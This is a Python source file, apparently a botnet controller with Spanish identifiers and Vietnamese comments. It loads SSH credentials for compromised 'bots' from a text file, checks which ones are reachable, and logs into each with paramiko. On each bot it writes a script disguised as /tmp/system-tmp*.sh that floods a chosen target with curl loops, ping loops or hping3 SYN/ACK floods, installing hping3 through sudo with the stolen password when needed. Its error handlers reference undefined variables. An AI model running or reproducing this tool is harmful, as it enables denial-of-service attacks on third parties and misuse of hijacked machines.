import paramiko
import time
import random
import socket
import fileinput

ip_equipos=[]
user_equipos=[]
password_equipos=[]
hping_equipos=[]
ip_equipos_alive=[]
user_equipos_alive=[]
password_equipos_alive=[]
hping_equipos_alive=[]
total_equipos=0
total_bots=0

# Tổng số bot có trước đó trả về biến global total_equipos
def load_ataque():

    global total_equipos

    with open("equipos.txt","r") as e:

        for line in e:
            ip_equipos.append(line.split(":")[0])
            user_equipos.append(line.split(":")[1])
            password_equipos.append(line.split(":")[2])
            hping_equipos.append(line.strip("\n").split(":")[3])
            total_equipos += 1

# Chọn một bot cụ thể
def select_bot(option):

    ip=""
    password=""
    user=""

    for i in range(total_equipos):

        if i == option:
            ip = ip_equipos[i]
            password = password_equipos[i]
            user = user_equipos[i]

    return ip, user, password

# In ra các bot còn sống, trả về tổng số bot còn sống
def bots_alive():

    global total_bots

    print('''
+--------------------+
| List of bots alive |
+--------------------+''')

    for i in range(total_equipos):

        a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        location = (ip_equipos[i],22)
        a_socket.settimeout(0.1)

        result_of_check = a_socket.connect_ex(location)

        if result_of_check == 0:
            print(f'''       |
       +---> Bot {[i]}: IP:{ip_equipos[i]} USER:{user_equipos[i]} PASS={password_equipos[i]}''')
            a_socket.close()
            ip_equipos_alive.append(ip_equipos[i])
            user_equipos_alive.append(user_equipos[i])
            password_equipos_alive.append(password_equipos[i])
            hping_equipos_alive.append(hping_equipos[i])
            total_bots += 1

    print(f'\nBots alive: {total_bots}')

    return total_bots

# Tấn công
# 1: http get
# 2: ping icmp
# 3: SYN / ACK

def attack(ip, command, port, type):

    for i in range(total_bots):

        try:

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )

            ssh.connect(ip_equipos_alive[i], username=user_equipos_alive[i], password=password_equipos_alive[i])

            numero = str(random.randrange(1000000, 10000000))

            print(f'[*] Command sent IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}\n')

            if command == 1:

                stdin, stdout, stderr = ssh.exec_command(f"touch /tmp/system-tmp" + numero + ".sh \n cd /tmp \n echo 'for i in {1..10000..1}; do curl "+ip+"; done'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n ./system-tmp"+numero+".sh &", timeout=6)

            elif command == 2:

                d, e, f = ssh.exec_command(f"touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'for i in {1..10000..1}; do ping "+ip+"; done'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n ./system-tmp"+numero+".sh &")

            elif command == 3:

                if hping_equipos_alive[i] == "NS":

                    stdin, stdout, stderr = ssh.exec_command(f"sudo -S <<< '{password_equipos_alive[i]}' apt install hping3")
                    exit_status = stdout.channel.recv_exit_status()          # Blocking call

                    if exit_status == 0:
                        print("[*] Hping3 Installing Completed\n")
                    else:
                        print("[*] Hping3 Installing Failed, Error: ", exit_status, "\n")
                        continue

                    textToSearch = ip_equipos_alive[i]+":"+user_equipos_alive[i]+":"+password_equipos_alive[i]+":"+"NS"
                    textToReplace = ip_equipos_alive[i]+":"+user_equipos_alive[i]+":"+password_equipos_alive[i]+":"+"SI"
                    fileToSearch  = "equipos.txt"
                    tempFile = open( fileToSearch, 'r+' )

                    for line in fileinput.input( fileToSearch ):
                        tempFile.write( line.replace( textToSearch, textToReplace ) )
                    tempFile.close()

                    a,b,c = ssh.exec_command("touch /tmp/system-tmp" + numero + ".sh \n cd /tmp \n echo 'hping3 -p " + port + " " + type + " --flood " + ip + "'>> system-tmp" + numero + ".sh \n chmod 755 system-tmp" + numero + ".sh \n sudo -S <<< " + password_equipos_alive[i] + " ./system-tmp" + numero + ".sh &\n")
                    time.sleep(1)

                elif hping_equipos_alive[i] == "SI":

                    a,b,c = ssh.exec_command("touch /tmp/system-tmp" + numero + ".sh \n cd /tmp \n echo 'hping3 -p " + port + " " + type + " --flood " + ip + "'>> system-tmp" + numero + ".sh \n chmod 755 system-tmp" + numero + ".sh \n sudo -S <<< " + password_equipos_alive[i] + " ./system-tmp" + numero + ".sh &\n")
                    time.sleep(1)

            ssh.close()

        except paramiko.ssh_exception.AuthenticationException:

            print(f'[*] Authentication Failed IP:{bot} USER:{user} PASS={password}')

        except paramiko.SSHException:

            print(f'[*] The request was rejected or the channel was closed IP:{bot} USER:{user} PASS={password}')

        ssh.close()

# Clear các mảng và biến như thiết lập ban đầu
def delete_list():
    ip_equipos.clear()
    user_equipos.clear()
    password_equipos.clear()
    hping_equipos.clear()
    ip_equipos_alive.clear()
    user_equipos_alive.clear()
    password_equipos_alive.clear()
    hping_equipos_alive.clear()
    global total_equipos
    total_equipos=0
    global total_bots
    total_bots=0
